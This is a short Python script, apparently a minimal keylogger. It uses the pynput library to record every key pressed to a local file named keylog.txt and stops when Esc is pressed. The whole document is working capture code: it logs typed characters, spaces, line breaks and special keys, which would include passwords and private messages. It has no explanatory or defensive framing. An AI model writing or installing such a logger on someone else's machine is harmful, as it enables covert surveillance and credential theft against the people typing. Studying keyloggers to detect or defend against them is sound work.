from pynput import keyboard
def pressing(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open("keylog.txt", "a") as f:
                f.write(" ")
        elif key == keyboard.Key.enter:
            with open("keylog.txt", "a") as f:
                f.write("\n")
        else:
            with open("keylog.txt", "a") as f:
                f.write(f"[{key}]")

def releasing(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=pressing, on_release=releasing) as listener:
    listener.join()